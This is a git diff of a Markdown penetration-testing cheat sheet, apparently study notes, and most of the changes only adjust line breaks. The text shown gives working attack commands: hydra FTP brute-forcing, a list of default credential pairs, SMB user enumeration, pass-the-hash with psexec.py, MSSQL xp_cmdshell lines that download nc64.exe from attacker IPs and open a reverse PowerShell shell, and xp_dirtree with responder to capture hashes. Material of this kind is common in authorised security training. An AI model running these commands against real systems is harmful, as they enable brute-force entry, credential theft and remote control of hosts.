@@ -12,8 +12,7 @@
 
 `hydra -l <user list> -P <password list> ftp://$ip`
 
-- common creds patterns
-
+- common creds patterns<br>
 admin/admin<br>
 root/root<br>
 password/password<br>
@@ -39,8 +38,7 @@ username/username<br>
 
 # 445 SMB
 
-**Without Pass**
-
+**Without Pass**<br>
 `enum4linux -a $ip`<br>
 `impacket-lookupsid $domain/$user@$domain -no-pass`<br>
 `smbmap  -H 10.10.10.100 --depth 10 -r   #List Shares`<br>
@@ -49,12 +47,10 @@ username/username<br>
 
 
 **With Pass**
-	
 `lookupsid.py  $domain$user:$pass@$domain`<br>
-
-`lookupsid.py  #domain/$user:$pass@$ip | grep SidTypeUser | cut -d " " -f 2 | cut -d '\' -f 2     
+`lookupsid.py  #domain/$user:$pass@$ip | grep SidTypeUser | cut -d " " -f 2 | cut -d '\' -f 2<br>
 > [!IMPORTANT]
-> This oneliner will create a file with all the domain users`
+> This oneliner will create a file with all the domain users
 
 `psexec.py -hashes  :<ntlm hash>    $user@$ip`<br>
 `smbmap -H  hokkaido-aerospace.com -u info -p info --depth 10 -r`<br>
@@ -118,7 +114,8 @@ username/username<br>
 `xp_cmdshell "certutil -urlcache -f http://192.168.45.247/nc64.exe nc64.exe"  #If cmd command dose not work, upgrade to poershell`<br>
 `xp_cmdshell "powershell -Command "(New-Object Net.WebClient).DownloadFile(''http://10.10.149.147:1235/nc64.exe'',''C:\Windows\Temp\nc64.exe'')"`<br>
 `xp_cmdshell "/windows/temp/nc64.exe 10.10.149.147 1234 -e powershell"`<br>
-	
+
+
 **capture**<br>
 `xp_dirtree \\192.168.1.210\shared`<br>
 `responder -I tun01`
